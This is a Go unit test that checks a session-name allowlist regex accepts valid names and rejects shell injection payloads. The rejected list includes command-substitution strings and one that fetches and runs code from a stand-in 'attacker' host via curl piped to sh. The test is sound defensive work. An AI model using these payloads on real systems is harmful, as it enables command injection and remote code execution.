package watcher

import (
	"testing"
)

// TestSafeNameRe verifies that the strict allowlist rejects shell injection
// payloads and accepts legitimate Pinard session names.
func TestSafeNameRe(t *testing.T) {
	allowed := []string{
		"myagent",
		"parcelle--project-123",
		"webterm--pinard-665e4ef8",
		"foo_bar",
		"ABC-def-123",
		"a",
	}
	for _, name := range allowed {
		if !safeNameRe.MatchString(name) {
			t.Errorf("safeNameRe: expected %q to be allowed", name)
		}
	}

	// Injection payloads must all be rejected.
	rejected := []string{
		"foo$(id)",
		"foo;touch${IFS}/tmp/pwned",
		"a`whoami`",
		"x$(curl${IFS}attacker/x|sh)",
		"name with spaces",
		"name\twith\ttabs",
		"name\nwith\nnewlines",
		"../traversal",
		"foo|bar",
		"foo&bar",
		"foo>bar",
		"foo<bar",
		"foo'bar",
		`foo"bar`,
		"foo\\bar",
		"foo!bar",
		"foo*bar",
		"foo?bar",
		"foo[bar",
		"foo]bar",
		"foo{bar",
		"foo}bar",
		"foo~bar",
		"foo#bar",
		"foo@bar",
		"foo%bar",
		"foo^bar",
		"foo=bar",
		"foo+bar",
		"foo,bar",
		"foo.bar",
		"foo:bar",
		"",
	}
	for _, name := range rejected {
		if safeNameRe.MatchString(name) {
			t.Errorf("safeNameRe: expected %q to be rejected", name)
		}
	}
}
